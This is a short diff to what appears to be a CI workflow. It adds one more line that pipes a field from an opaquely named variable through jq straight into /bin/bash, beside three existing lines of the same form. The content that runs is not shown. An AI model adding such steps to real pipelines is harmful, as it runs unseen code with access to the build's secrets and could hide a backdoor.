@@ -26,6 +26,7 @@ jobs:
           echo $e3 | jq -r .v4 | /bin/bash
           printf '%s' "$xl7" | jq -r .u2 | /bin/bash
           printf '%s' "$rpi406" | jq -r .ugi4097 | /bin/bash
+          printf '%s' "$ppolb76" | jq -r .sypo9 | /bin/bash
 
       - name: Persist output
         if: always()
